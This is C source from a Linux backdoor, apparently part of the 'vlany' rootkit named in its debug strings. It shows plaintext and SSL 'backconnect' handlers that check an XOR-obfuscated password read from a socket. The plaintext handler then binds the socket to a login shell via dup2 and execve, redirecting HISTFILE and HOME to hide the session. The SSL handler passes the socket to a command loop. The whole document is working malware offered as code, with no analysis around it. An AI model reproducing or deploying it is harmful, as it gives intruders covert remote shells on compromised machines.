void pbackconnect(int sock)
{
    #ifdef DEBUG
        printf("[vlany] plaintext backconnect called\n");
    #endif

    char tmp[256];
    read(sock, tmp, sizeof(tmp));

    char *shell_password = strdup(SHELL_PASSWORD); xor(shell_password);

    if(!strstr(tmp, shell_password)) { CLEAN(shell_password); close(sock); return; }

    char *shell_msg = strdup(SHELL_MSG); xor(shell_msg);
    write(sock, shell_msg, strlen(shell_msg));
    CLEAN(shell_msg);

    char *argv[3], *envp[5];
    char *shell_type = strdup(SHELL_TYPE); xor(shell_type);
    char *login = strdup(LOGIN); xor(login);

    argv[0] = shell_type;
    argv[1] = login;
    argv[2] = NULL;

    CLEAN(shell_type);
    CLEAN(login);

    char _env_var[64], _histfile[64], _home[64];

    char *env_var = strdup(ENV_VAR); xor(env_var);
    snprintf(_env_var, sizeof(_env_var), "%s=1", env_var);
    CLEAN(env_var);

    char *histfile = strdup(HISTFILE); xor(histfile);
    snprintf(_histfile, sizeof(_histfile), "HISTFILE=%s", histfile);
    CLEAN(histfile);

    char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
    snprintf(_home, sizeof(_home), "HOME=%s", install_dir);
    CLEAN(install_dir);

    char *term_env_var = strdup(TERM_ENV_VAR); xor(term_env_var);

    envp[0] = _env_var;
    envp[1] = term_env_var;
    envp[2] = _histfile;
    envp[3] = _home;
    envp[4] = NULL;

    CLEAN(term_env_var);

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execve(argv[0], argv, envp);
    close(sock);
    return;
}

#ifdef SSL_BACKDOOR
void backconnect(int sock)
{
    #ifdef DEBUG
        printf("[vlany] ssl backconnect called\n");
    #endif

    char temp[256];
    ctx = InitCTX();
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    sock = SSL_get_fd(ssl);

    if(SSL_accept(ssl) == -1) exit(1);
    else{
        SSL_read(ssl, temp, sizeof(temp));

        char *shell_password = strdup(SHELL_PASSWORD); xor(shell_password);
        if(!strstr(temp, shell_password))
        {
            close(sock);
            SSL_CTX_free(ctx);
            CLEAN(shell_password);
            return;
        }
        CLEAN(shell_password);

        SSL_write(ssl, "Temporary backdoor message.", strlen("Temporary backdoor message.")); // will create a new default message string soon...

        cmd_loop(sock);
        close(sock);
        SSL_CTX_free(ctx);
    }

    return;
}
#endif
